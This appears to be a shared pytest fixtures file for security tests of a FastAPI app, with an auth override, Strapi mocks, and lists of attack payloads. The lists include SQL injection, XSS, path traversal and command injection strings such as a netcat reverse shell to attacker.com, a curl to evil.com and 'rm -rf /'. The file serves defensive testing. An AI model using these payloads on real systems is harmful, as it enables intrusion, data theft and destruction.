"""
Security test fixtures — shared across SAST and DAST test modules.
Provides TestClient, auth overrides, and common attack payload generators.
"""
import pytest
import io
from unittest.mock import MagicMock, patch
from fastapi.testclient import TestClient

from api.main import app
from api.core.auth import verify_admin_access


# ---------------------------------------------------------------------------
# TestClient
# ---------------------------------------------------------------------------

@pytest.fixture
def client():
    return TestClient(app)


# ---------------------------------------------------------------------------
# Admin auth override
# ---------------------------------------------------------------------------

@pytest.fixture
def admin_user():
    return {
        "id": "1",
        "email": "admin@10academy.org",
        "username": "admin_admin@10academy.org",
        "role": "Staff",
    }


@pytest.fixture
def authed_client(client, admin_user):
    app.dependency_overrides[verify_admin_access] = lambda: admin_user
    yield client
    app.dependency_overrides.pop(verify_admin_access, None)


# ---------------------------------------------------------------------------
# Strapi boundary mocks (prevent real external calls during security tests)
# ---------------------------------------------------------------------------

@pytest.fixture(autouse=True)
def mock_strapi_for_security():
    """Auto-mock Strapi to prevent real external calls during security tests."""
    with patch("api.services.trainee_service.StrapiGraphql") as MockSG, \
         patch("api.services.trainee_service.StrapiMethods") as MockSM, \
         patch("api.services.trainee_service.CommunicationManager") as MockCM:

        sg = MagicMock()
        sg.apiroot = "https://mock.10academy.org/graphql"
        MockSG.return_value = sg

        sm = MagicMock()
        sm.apiroot = "https://mock.10academy.org"
        sm.token = "mock-token"
        sm.insert_data.return_value = {
            "id": "t-1", "email": "e", "trainee_id": "tid", "Status": "Accepted"
        }
        MockSM.return_value = sm

        cm = MagicMock()
        cm.create_user.return_value = {
            "data": {"register": {"user": {"id": "u-1"}}}
        }
        cm.insert_all_users.return_value = {
            "data": {"createAllUser": {"data": {"id": "a-1"}}}
        }
        cm.insert_profile_information.return_value = {
            "data": {"createProfileInformation": {"data": {"id": "p-1"}}}
        }
        MockCM.return_value = cm
        yield {"sg": sg, "sm": sm, "cm": cm}


# ---------------------------------------------------------------------------
# Common attack payloads
# ---------------------------------------------------------------------------

SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "1' UNION SELECT * FROM users--",
    "admin'--",
    "' OR 1=1; --",
    "1; UPDATE users SET role='admin'",
    "' WAITFOR DELAY '0:0:5'--",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "') OR ('1'='1",
    "'; EXEC xp_cmdshell('whoami'); --",
]

XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert('xss')>",
    "javascript:alert('xss')",
    "<svg onload=alert('xss')>",
    "'\"><script>alert(document.cookie)</script>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<body onload=alert('xss')>",
    "{{7*7}}",  # SSTI
    "${7*7}",  # Template injection
    "<div style='background:url(javascript:alert(1))'>",
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "& ping -c 1 127.0.0.1",
    "; rm -rf /",
    "| nc -e /bin/sh attacker.com 4444",
    "&& curl http://evil.com",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd%00",
    "....\\....\\....\\etc\\passwd",
]

HEADER_INJECTION_PAYLOADS = [
    "value\r\nInjected-Header: malicious",
    "value\nSet-Cookie: stolen=true",
    "value\r\nX-Injected: true",
]

NOSQL_INJECTION_PAYLOADS = [
    {"$gt": ""},
    {"$ne": None},
    {"$regex": ".*"},
    {"$where": "1==1"},
]
